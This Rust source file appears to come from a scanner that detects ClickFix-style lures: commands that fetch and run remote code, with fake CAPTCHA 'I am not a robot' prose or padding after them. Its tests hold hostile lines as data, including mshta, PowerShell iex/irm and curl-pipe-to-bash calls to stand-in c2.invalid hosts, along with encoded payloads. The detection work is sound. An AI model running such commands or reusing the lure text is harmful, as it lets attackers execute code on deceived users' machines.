//! Feature extraction. Each feature is independent and returns a weight contribution.

use crate::rules::{FeatureClass, RuleSet};
use crate::util::{has_interpreter_token, re, shannon_entropy, snippet};
use regex::Regex;
use serde::Serialize;
use std::sync::LazyLock;

#[derive(Debug, Clone, Serialize)]
pub struct Hit {
    pub feature: String,
    pub class: FeatureClass,
    pub weight: f64,
    /// 0 = raw text, 1.. = decoded layers.
    pub layer: usize,
    /// Short excerpt around the match. Only surfaced for warn+ verdicts.
    pub evidence: String,
}

/// Evaluate every regex rule plus the text-local computed features on one layer.
pub fn evaluate_layer(rules: &RuleSet, text: &str, layer: usize) -> Vec<Hit> {
    let mut hits = Vec::new();
    for rule in &rules.rules {
        if let Some((s, e)) = rule.matches(text) {
            hits.push(Hit {
                feature: rule.id.clone(),
                class: rule.class,
                weight: rule.weight,
                layer,
                evidence: snippet(text, s, e),
            });
        }
    }
    if let Some(ev) = trailing_decoy_prose(text) {
        hits.push(Hit {
            feature: "trailing_decoy_prose".into(),
            class: FeatureClass::Structural,
            weight: rules.computed.trailing_decoy_prose.weight,
            layer,
            evidence: ev,
        });
    }
    let ent = &rules.computed.interpreter_entropy;
    if let Some(ev) = gated_entropy(text, ent.min_token_len, ent.min_bits) {
        hits.push(Hit {
            feature: "interpreter_entropy".into(),
            class: FeatureClass::Behavioral,
            weight: ent.weight,
            layer,
            evidence: ev,
        });
    }
    hits
}

static DECOY_KEYWORDS: LazyLock<Regex> = LazyLock::new(|| {
    re(
        r"robot|human|captcha|verif|identificator|identifier|validation|cloudflare|ray\s*id|product\s*key|activation|i\s+am\s+not|\bid\s*[:#]|confirm|press\s+enter|security\s+check|access\s+code|authenticat|\bfix\b|update\s+(?:id|code)|reference|✅|✔",
    )
});
// `[^\S\r\n]` is whitespace other than a line break: the separator must sit on the same
// line as the command, or the newline + indentation of any pretty-printed output reads
// as decoy padding.
static SPLIT: LazyLock<Regex> =
    LazyLock::new(|| re(r"[^\S\r\n]#|[^\S\r\n]::[^\S\r\n]|[^\S\r\n]+rem[^\S\r\n]|[^\S\r\n]{8,}"));

/// Phrases that only appear in lure text aimed at the victim. Unlike the general keywords
/// ("verify", "confirm", "reference"), they almost never occur in output, scripts or docs,
/// so they count on any later line of a multi-line paste.
static STRONG_DECOY: LazyLock<Regex> = LazyLock::new(|| {
    re(
        r"\bnot\s+a\s+robot\b|\bi\s*'?\s*a?m\s+not\s+a\b|\byou\s+are\s+(?:a\s+)?human\b|captcha|cloudflare|\bray\s*id\b|identificator|\bverification\s+(?:id|code)\b|\bsecurity\s+check\b|\baccess\s+code\b|✅|✔",
    )
});

/// A line that names an interpreter as a command, not as a value in JSON or YAML output.
fn command_line(line: &str) -> bool {
    let t = line.trim_start();
    has_interpreter_token(line) && !t.starts_with(['"', '\'', '{', '['])
}

/// A later line where lure text sits: a comment, a line pushed right by padding, or the
/// last line of the paste.
fn decoy_line(line: &str, is_last: bool) -> bool {
    let t = line.trim_start();
    let indent = line.len() - t.len();
    is_last
        || t.starts_with('#')
        || t.starts_with("::")
        || t.to_ascii_lowercase().starts_with("rem ")
        || indent >= 8
}

fn prose_words(s: &str) -> usize {
    s.split(|c: char| !c.is_alphanumeric())
        .filter(|w| {
            w.len() >= 2 && w.chars().filter(|c| c.is_alphabetic()).count() * 10 >= w.len() * 6
        })
        .count()
}

/// Executable portion followed by human-facing prose meant for the victim's eyes (the
/// Run dialog shows only the tail of a long line). Requires an interpreter token in the
/// head so a plain `ls # list files` never fires.
///
/// Two shapes count:
/// - **Same line:** prose after a comment marker or padding on the command's own line.
///   Any decoy keyword counts here.
/// - **Later line:** a comment, a padded line or the last line, after a line that runs an
///   interpreter (not one that merely names it as a JSON or YAML value). Only strong lure
///   phrases count here, so transcripts, JSON output and documented installers stay quiet.
pub fn trailing_decoy_prose(text: &str) -> Option<String> {
    let t = text.trim_end();
    let lines: Vec<&str> = t.split(['\n', '\r']).collect();
    for line in &lines {
        for m in SPLIT.find_iter(line) {
            if !has_interpreter_token(&line[..m.start()]) {
                continue;
            }
            let tail = &line[m.start()..];
            if prose_words(tail) >= 3
                && (DECOY_KEYWORDS.is_match(tail) || tail.contains("        "))
            {
                return Some(tail.trim().chars().take(80).collect());
            }
        }
    }

    // On later lines only strong lure phrases count: a weak word ("verify", "confirm")
    // in the comment after an installer command is ordinary documentation.
    let last_idx = lines.iter().rposition(|l| !l.trim().is_empty())?;
    let first_cmd = lines.iter().position(|l| command_line(l))?;
    lines[first_cmd + 1..]
        .iter()
        .enumerate()
        .find(|(i, l)| {
            decoy_line(l, first_cmd + 1 + i == last_idx)
                && prose_words(l) >= 3
                && STRONG_DECOY.is_match(l)
        })
        .map(|(_, l)| l.trim().chars().take(80).collect())
}

static TOKEN_SPLIT: LazyLock<Regex> = LazyLock::new(|| re(r#"[\s'"(),;|&<>`{}\[\]]+"#));
static ARN_URN: LazyLock<Regex> = LazyLock::new(|| re(r"(?:^|[^a-z0-9])(?:arn|urn):"));

/// The parts of a token to measure. A colon-delimited identifier (an ARN or URN, or any
/// single-case token such as an IPv6 address, a fingerprint or an image reference) is
/// measured piece by piece, since joined it reads as one random blob. Anything else,
/// including a mixed-case blob chopped up with colons, is measured whole: base64 is
/// mixed-case, so inserting `:` does not hide it.
fn entropy_units(token: &str) -> Vec<&str> {
    if !token.contains(':') {
        return vec![token];
    }
    let mixed = token.bytes().any(|b| b.is_ascii_uppercase())
        && token.bytes().any(|b| b.is_ascii_lowercase());
    if ARN_URN.is_match(token) || !mixed {
        token.split(':').collect()
    } else {
        vec![token]
    }
}

/// Entropy contributes only when an interpreter token is present in the same observation.
/// JWTs, PEM blocks, .env values and minified JS are high entropy and benign.
pub fn gated_entropy(text: &str, min_len: usize, min_bits: f64) -> Option<String> {
    if !has_interpreter_token(text) {
        return None;
    }
    TOKEN_SPLIT
        .split(text)
        .flat_map(entropy_units)
        .filter(|t| t.len() >= min_len)
        .find(|t| shannon_entropy(t) >= min_bits)
        .map(|t| {
            format!(
                "{}… ({:.2} bits)",
                t.chars().take(24).collect::<String>(),
                shannon_entropy(t)
            )
        })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn decoy_prose() {
        assert!(trailing_decoy_prose("mshta https://c2.invalid/v.mp4 # ✅ ''I am not a robot - reCAPTCHA Verification ID: 2165''").is_some());
        assert!(trailing_decoy_prose("powershell -w h -c \"iex(irm c2.invalid/a)\"                                   Cloud Identificator: 2031 press enter").is_some());
        assert!(trailing_decoy_prose("ls -la # list all files here").is_none());
        assert!(trailing_decoy_prose("bash build.sh # build it").is_none());
    }

    #[test]
    fn decoy_prose_across_lines() {
        // A final line of prose after a single command still counts.
        assert!(trailing_decoy_prose(
            "bash -c 'curl x.invalid/a | sh'\n# I am not a robot verification"
        )
        .is_some());
        assert!(trailing_decoy_prose(
            "bash -c 'curl x.invalid/a | sh'\n\n\n\n\n\n     Cloud Identificator: 2031 press enter"
        )
        .is_some());
        assert!(trailing_decoy_prose(
            "cd /tmp\nbash -c 'curl x.invalid/a | sh'\n\n\n\n# I am not a robot verification"
        )
        .is_some());
        // A command with no prose after it does not.
        assert!(trailing_decoy_prose("bash -c 'curl x.invalid/a | sh'\n\n\n\n").is_none());
    }

    #[test]
    fn pretty_printed_output_is_not_decoy_padding() {
        // Interpreter named in one JSON field, deeper indentation and prose-like words later.
        let transcript = r#"~ $ aws lambda get-function-configuration --function-name f
{
    "run": "python3.13",
    "role": "arn:aws:iam::111122223333:role/example-password-recovery-trigger",
    "env": [
        "REVOCATION_BUCKET",
        "USER_POOL_ID"
    ]
}
~ $ aws lambda get-policy --function-name f --query Policy --output text | jq .
{
  "Statement": [
    {
      "Sid": "CognitoRecoveryInvoke",
      "Action": "lambda:InvokeFunction",
      "Condition": {
        "StringEquals": {
          "AWS:SourceAccount": "111122223333"
        }
      }
    }
  ]
}"#;
        assert!(trailing_decoy_prose(transcript).is_none());
        assert!(gated_entropy(transcript, 32, 4.5).is_none());
    }

    #[test]
    fn strong_lure_phrases_count_on_later_lines() {
        let l = "curl -fsSL https://c2.invalid/m | bash";
        for t in [
            format!("cd /tmp\n{l}\n# I am not a robot - reCAPTCHA Verification ID: 2165"),
            format!("cd /tmp\n{l}\n              Cloud Identificator: 2031 press enter"),
            format!("{l}\n# I am not a robot\n# Verification ID: 2165"),
            format!("{l}\n# I am not a robot - reCAPTCHA\necho done"),
        ] {
            assert!(trailing_decoy_prose(&t).is_some(), "{t:?}");
        }
        // Weak words on later lines of a script stay quiet.
        assert!(trailing_decoy_prose(&format!(
            "cd app\n{l}\n# verify the install and confirm the version\necho done"
        ))
        .is_none());
        // An interpreter named only in JSON output is not a command line.
        assert!(trailing_decoy_prose(
            "{\n  \"run\": \"python3\",\n  \"note\": \"captcha service, not a robot farm\"\n}"
        )
        .is_none());
    }

    #[test]
    fn entropy_measures_mixed_case_colon_blobs_whole() {
        // base64("iex (iwr https://c2.invalid/x)") chopped with colons.
        let blob = "python3 x.py aWV4IChp:d3IgaHR0:cHM6Ly9j:Mi5pbnZh:bGlkL3gp:Yk9xUjZ3";
        assert!(gated_entropy(blob, 32, 4.5).is_some());
        for id in [
            "python3 a.py 2001:0db8:85a3:0000:0000:8a2e:0370:7334:fe80:0000:0202:b3ff",
            "bash a.sh AA:BB:CC:DD:EE:FF:00:11:22:33:44:55:66:77:88:99:AA:BB:CC:DD",
            "python3 a.py --role-arn=arn:aws:iam::111122223333:role/Example_LmlJElh73Trigger",
        ] {
            assert!(gated_entropy(id, 32, 4.5).is_none(), "{id}");
        }
    }

    #[test]
    fn entropy_ignores_colon_delimited_identifiers() {
        let arn = "python3 run.py arn:aws:lambda:us-east-1:111122223333:function:example-password-recovery";
        assert!(gated_entropy(arn, 32, 4.5).is_none());
    }

    #[test]
    fn entropy_gate() {
        let jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
        assert!(gated_entropy(jwt, 32, 4.5).is_none());
        assert!(gated_entropy(
            &format!(
                "powershell -enc {}",
                "H4sIAAAAAAAEAMtIzcnJVyjPL8pJAQCFEUoNCwAAAJx3Kq9Zb8Rm2Tw1pQ"
            ),
            32,
            4.5
        )
        .is_some());
    }
}
